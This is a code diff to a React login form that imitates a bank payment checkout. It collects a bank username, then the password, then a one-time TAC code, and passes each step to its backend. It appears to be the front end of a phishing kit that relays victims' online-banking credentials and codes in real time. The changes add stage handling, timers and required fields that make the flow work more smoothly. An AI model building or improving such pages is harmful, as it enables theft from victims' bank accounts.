@@ -121,7 +121,9 @@ function LoginForm({ id, bank, amount }) {
             if (result.data.code == 400) {
               setStage(bodyState.ERROR);
             } else {
+              setStart(Date.now());
               setStage(bodyState.PASSWORD);
+
               setCompleted(40);
             }
           } catch (e) {
@@ -144,15 +146,18 @@ function LoginForm({ id, bank, amount }) {
               }
             );
 
-            console.log(result.data);
+            if (result.data.code == 400) {
+              setStage(bodyState.ERROR);
+            } else {
+              const phoneNumber = result.data.phoneNumber;
+              const date = result.data.date;
 
-            const phoneNumber = result.data.phoneNumber;
-            const date = result.data.date;
-
-            setTacPhoneNumber(phoneNumber);
-            setTacDate(date);
-            setStage(bodyState.TAC);
-            setCompleted(80);
+              setStart(Date.now());
+              setTacPhoneNumber(phoneNumber);
+              setTacDate(date);
+              setStage(bodyState.TAC);
+              setCompleted(80);
+            }
           } catch (e) {
             console.log(e);
             setStage(bodyState.ERROR);
@@ -168,6 +173,12 @@ function LoginForm({ id, bank, amount }) {
             id: id,
             tac: tac,
           });
+
+          if (result.data.code == 200) {
+            setStage(bodyState.SUCCESS);
+          } else if (result.data.code == 300) {
+            setStage(bodyState.ERROR);
+          }
         }
         break;
       default:
@@ -198,6 +209,7 @@ function LoginForm({ id, bank, amount }) {
               value={username}
               placeholder="Bank Username"
               onChange={handleUsernameChange}
+              required
             />
             <button
               className={`${styles["modal-btn"]} ${styles["form-control"]}`}
@@ -222,6 +234,7 @@ function LoginForm({ id, bank, amount }) {
               value={password}
               placeholder="Bank Password"
               onChange={handlePasswordChange}
+              required
             />
             <button
               className={`${styles["modal-btn"]} ${styles["form-control"]}`}
@@ -243,6 +256,7 @@ function LoginForm({ id, bank, amount }) {
               type="text"
               value={tac}
               onChange={handleTACChange}
+              required
             />
             <button
               className={`${styles["modal-btn"]} ${styles["form-control"]}`}
@@ -311,7 +325,7 @@ function LoginForm({ id, bank, amount }) {
           <img src={banks[bank].logo} className={styles["img-circle"]} />
           <h4>{banks[bank].name}</h4>
           <br />
-          <div id={styles["refid"]}>Reference ID: 2129804</div>
+          <div id={styles["refid"]}>Reference ID: {id.split("-")[0]}</div>
           <small>Amount to charge</small>
           <h3 className={styles["amount"]}>MYR {amount}.00</h3>
           <ProgressBar bgcolor={"#2ecc71"} completed={completed} />
